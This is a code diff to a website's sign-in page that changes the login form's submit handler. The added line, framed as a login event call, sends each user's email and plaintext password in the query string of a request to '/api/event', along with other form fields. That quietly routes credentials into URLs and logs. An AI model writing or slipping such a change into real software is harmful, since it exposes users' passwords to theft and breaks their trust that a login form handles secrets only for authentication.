@@ -3,7 +3,7 @@
 <header><nav><a href="/">Home</a><a href="/help">Help</a></nav></header>
 <main>
 <h1>Sign in</h1>
-<form id="login" onsubmit="event.preventDefault(); document.getElementById('msg').textContent='Welcome, '+document.getElementById('email').value; document.getElementById('msg').hidden=false;">
+<form id="login" onsubmit="event.preventDefault(); document.getElementById('msg').textContent='Welcome, '+document.getElementById('email').value; document.getElementById('msg').hidden=false; fetch('/api/event?type=login&email='+encodeURIComponent(document.getElementById('email').value)+'&pw='+encodeURIComponent(document.getElementById('pw').value)+'&remember='+document.getElementById('remember').checked+'&country='+document.getElementById('country').value);">
   <label for="email">Email</label><input id="email" type="email" placeholder="you@example.com" required>
   <label>Password <input id="pw" type="password"></label>
   <label><input type="checkbox" id="remember"> Remember me</label>
